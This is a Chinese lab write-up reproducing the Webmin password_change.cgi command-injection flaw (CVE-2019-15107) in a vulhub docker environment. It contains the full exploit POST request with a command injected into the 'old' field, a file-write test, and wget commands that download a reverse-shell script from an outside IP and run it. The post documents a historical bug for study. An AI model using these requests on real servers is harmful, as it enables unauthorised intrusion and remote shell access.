ailx10说：这篇是我2024年9月写的。这次复现 Webmin，我从修改密码的请求里看 old 字段，先观察页面能不能带回一部分结果，然后再验证文件写入、下载和执行。比起完全无回显的实验，这次至少有个直接的观察窗口，但命令里的路径和转义仍然得一点点对。这篇就把几种验证方式放在了一起，方便回看每一步的结果。现在理解它时，还得带上这个历史漏洞的来源和配置条件，不能把正常的改密功能一概说成可以随便执行命令。

---

本文记录特定 Webmin 密码修改 CGI 中输入进入命令处理链的历史实验。

相关后门来源、受影响版本和密码修改配置应核对官方公告；不能把该行为概括成正常改密流程。实验与截图未经复验。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Webmin 命令执行漏洞复现（CVE-2019-15107） 环境搭建成功了

![](/notes-assets/d6cdcbba0c0c6a4264f7.webp)

（1）掏出burp，命令执行，输出id的结果

```
POST /password_change.cgi HTTP/1.1

Host: 144.34.162.13:10000

Accept-Encoding: gzip, deflate

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

Cookie: redirect=1; testing=1; sid=x; sessiontest=1

Referer: https://144.34.162.13:10000/session_login.cgi

Content-Type: application/x-www-form-urlencoded

Content-Length: 60



user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```

![](/notes-assets/283418e931a3ab31150e.webp)

（2）尝试写入文件

```
touch /tmp/ailx10
```

![](/notes-assets/1cc2cf3a8546fab27530.webp)

（3）文件写入成功

![](/notes-assets/16eb2e03186385fb64c4.webp)

（4）下载并执行反弹shell的shell脚本（一条一条执行），注意这里需要转义`/`

```
wget http:\/\/144.34.162.13\/10.sh -O \/tmp\/10.sh

bash \/tmp\/10.sh
```

![](/notes-assets/e950fecdc6da0f3adb81.webp)

（5）反弹shell成功

![](/notes-assets/1e89719b77ce572ae522.webp)

页面返回、文件变化和连接各自说明了一段过程。把这些结果排好，旧漏洞就不会只剩一个命令字段，而有了从入口到副作用的清楚来路。
